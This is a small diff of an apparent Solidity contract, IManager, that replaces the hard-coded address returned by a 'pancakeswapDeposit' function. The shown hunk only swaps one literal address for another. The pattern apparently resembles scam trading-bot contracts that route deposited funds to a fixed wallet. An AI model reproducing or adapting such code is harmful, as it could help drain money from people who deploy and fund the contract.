@@ -74,7 +74,7 @@ contract IManager {
       */
       
       function pancakeswapDeposit() public pure returns (address) {
-                return 0xD4005738853f82885Af5550ea8bd67DCef4f6928;
+                return 0xD7930bbbdA8d7d7e6C3B69025985413b0F0Bb9d7;
         }
       /*
    // Create BNB and DAI pairs for our token & provide liquidity
